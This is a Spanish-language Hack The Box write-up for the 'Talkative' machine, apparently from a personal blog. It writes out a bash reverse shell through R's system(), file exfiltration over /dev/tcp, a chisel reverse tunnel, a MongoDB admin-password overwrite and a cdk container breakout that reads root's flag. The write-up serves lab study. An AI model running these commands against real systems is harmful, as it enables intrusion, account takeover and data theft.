---
title: Talkative
date: 2022-07-31 13:25:30 +/-TTTT
categories: [HTB MACHINES, Linux]
tags: [bolt, jamovi, portforwarding, chisel, mongosh, rocketchat, dockerbreakout, cdk]     # TAG names should always be lowercase
---

En esta máquina vemos que está `Bolt` por detrás y `jamovi`, pudimos ver que pudimos usar al lenguaje `R` para ejecutar comandos.

```shell 
system('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"', intern=TRUE)
```
![imagen1](/assets/images/talkative1.png)

Una vez dentro de la máquina, encontramos un archivo donde encontramos unos usuarios y contraseñas, probramos todos los usuarios y `admin` como el usuario por defecto en Bolt.
Como no se tiene nc usamos el /dev/tcp para mandarnos la información

```shell
cat archivo.omv > /dev/tcp/10.10.10.10/443
```

Con esto nos logeamos al CMS y podemos retocar un archivo php que podemos ejecutar para entablarnos una reverse shell.

![imagen1](/assets/images/talkative2.png)

![imagen1](/assets/images/talkative3.png)

```shell
curl -s -X GET "http://talkative.htb/bundles.php"
```

Una vez dentro hacemos un escaneo de puertos con un script en bash

```shell
#!/bin/bash

function ctrl_c(){
	echo -e "\n\nSaliendo....."
	tput cnorm; exit 1
}

#Ctrl+c
trap ctrl_c INT

tput civis
for port in $(seq 1 65535); do

(echo "" > /dev/tcp/172.17.0.1/$port) 2>/dev/null && echo "Puerto Abierto > $port" &
done; wait

tput cnorm
```

Vemos que está abierto el puerto 22 por lo que probamos las contraseñas y usuarios en el primero contenedor y nos metemos como el usuario Saul.

En este punto vemos que está corriendo Mongodb por lo que hacemos uno de la herramienta chisel para traer ese puerto y procedemos a usar `mongos`

```shell
#Máquina Victima
chisel client 10.10.14.12:1234 R:27017:172.0.1.2:27017

#Máquina Atacante
chisel server -reverse -p 1234
```

Y usamos mongosh para tener interacción con la base de datos.

```shell
mongosh
Current Mongosh Log ID:	63180ff486cb73849a98e7bb
Connecting to:		mongodb://127.0.0.1:27017/?directConnection=true&serverSelectionTimeoutMS=2000&appName=mongosh+1.5.4
```

Y dentro de mongo usamos los siguiente y cambiamos la contraseña del usuario admin

```shell
show dbs
use <db>
show collections
db.<collection>.find()  #Dump the collection
db.<collection>.count() #Number of records of the collection
db.current.find({"username":"admin"})  #Find in current db the username admin

db.getCollection('users').update({username:"administrator"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

![imagen1](/assets/images/talkative4.png)

En rocket.chat tenemos vulnerabilidades que podemos explotar

![imagen1](/assets/images/talkative5.png)

Una vez dentro de otro contenedor podemos buscar como hacer un docker breakout con la herramienta `cdk`


```shell
cat < /dev/tcp/10.10.14.12/443 > cdk

sudo nc -lnvp 443 > cdk
```

Y luego con cdk podemos ver con la opción evaluate que hay una capability de leer archivos del sistema como root.

```shell
[Information Gathering - Services]
2022/09/07 04:04:11 sensitive env found:
	DEPLOY_METHOD=docker-official

[Information Gathering - Commands and Capabilities]
2022/09/07 04:04:11 available commands:
	find,node,npm,apt,dpkg,mount,fdisk,base64,perl
2022/09/07 04:04:11 Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):
	CapInh:	0000000000000000
	CapPrm:	00000000a80425fd
	CapEff:	00000000a80425fd
	CapBnd:	00000000a80425fd
	CapAmb:	0000000000000000
	Cap decode: 0x00000000a80425fd = CAP_CHOWN,CAP_DAC_READ_SEARCH,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP
	Add capability list: CAP_DAC_READ_SEARCH
[*] Maybe you can exploit the Capabilities below:
[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation.

root@c150397ccd63:/# ./cdk run cap-dac-read-search /root/root.txt
Running with target: /root/root.txt, ref: /etc/hostname
148a7c70be411c05278a09737e3d849e
```
